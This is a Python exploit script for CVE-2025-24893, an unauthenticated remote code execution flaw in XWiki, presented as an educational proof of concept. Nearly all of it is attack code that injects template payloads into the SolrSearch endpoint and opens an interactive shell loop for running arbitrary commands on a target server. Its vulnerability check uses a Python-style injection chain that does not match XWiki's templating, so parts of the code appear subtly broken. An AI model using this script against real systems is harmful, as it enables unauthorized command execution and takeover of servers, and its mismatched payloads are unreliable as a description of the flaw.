#!/usr/bin/env python3
"""
CVE-2025-24893 - XWiki Unauthenticated RCE PoC (Educational / Authorized Testing Only)
Tested on XWiki <= 15.10.10 (vulnerable) / Works on 15.10.11+ only if still misconfigured
Github : https://github.com/B1ack4sh/Blackash-CVE-2025-24893
WARNING: Use ONLY on targets you own or have explicit permission to pentest.
Unauthorized use is illegal.
"""

import requests
import sys
import urllib.parse
from requests.packages.urllib3 import disable_warnings
disable_warnings()

def banner():
    print(r"""
 ██████╗  ██╗       █████╗   ██████╗ ██╗  ██╗  █████╗  ███████╗ ██╗  ██╗ 
 ██╔══██╗ ██║      ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔══██╗ ██╔════╝ ██║  ██║ 
 ██████╔╝ ██║      ███████║ ██║      █████╔╝  ███████║ ███████╗ ███████║ 
 ██╔══██╗ ██║      ██╔══██║ ██║      ██╔═██╗  ██╔══██║ ╚════██║ ██╔══██║ 
 ██████╔╝ ███████╗ ██║  ██║ ╚██████╗ ██║  ██╗ ██║  ██║ ███████║ ██║  ██║ 
 ╚═════╝  ╚══════╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝   CVE-2025-24893
                                      Critical XWiki Remote Code Execution Vulnerability
    """)
    print(" Educational PoC - Only for authorized security testing!\n")

def check_vulnerable(target):
    url = f"{target.rstrip('/')}/bin/get/Main/SolrSearch"
    params = {
        "search": "{{''.__class__.__mro__[1].__subclasses__()[414]('id', shell=True, capture_output=True).communicate()}}"
    }
    
    try:
        r = requests.get(url, params=params, timeout=15, verify=False, allow_redirects=False)
        if r.status_code == 200 and ("uid=" in r.text or "gid=" in r.text):
            print("[+] VULNERABLE! Command output detected:")
            print("    " + r.text.strip().replace("\n", "\n    "))
            return True
        else:
            print("[-] Not vulnerable or command didn't return output.")
            return False
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return False

def execute_command(target, command):
    # Classic Groovy RCE payload (works on most vulnerable instances)
    payload = f"#set($ex=$class.inspect('java.lang.Runtime').getRuntime().exec('{command}'))"
    payload += "#set($out=$ex.waitFor())#set($null=$ex.getInputStream().close())"
    
    encoded = urllib.parse.quote(payload, safe='')
    url = f"{target.rstrip('/')}/bin/get/Main/SolrSearch?search={encoded}&outputSyntax=plain"
    
    try:
        r = requests.get(url, timeout=20, verify=False, allow_redirects=False)
        if r.status_code == 200:
            print(f"[+] Command executed: {command}")
            print(f"    Output:\n{r.text.strip()}")
        else:
            print(f"[-] HTTP {r.status_code} - No output or blocked")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    banner()
    if len(sys.argv) < 2:
        print("Usage: python3 cve-2025-24893.py http://xwiki-target.com [command]")
        print("Example: python3 cve-2025-24893.py http://192.168.1.100:8080/ whoami")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Target: {target}")
    
    # Step 1: Quick vulnerability check (non-destructive)
    if not check_vulnerable(target):
        print("[*] Trying alternative detection...")
        # fallback quick ping check
        execute_command(target, "ping -c 1 127.0.0.1")  # harmless
    else:
        print("[+] Confirmed vulnerable!")
    
    # Step 2: Interactive or single command
    if len(sys.argv) >= 3:
        cmd = " ".join(sys.argv[2:])
        execute_command(target, cmd)
    else:
        print("\n[+] Interactive shell mode (type 'exit' to quit)")
        while True:
            try:
                cmd = input("RCE $> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                if cmd.strip():
                    execute_command(target, cmd)
            except KeyboardInterrupt:
                print("\nBye!")
                break
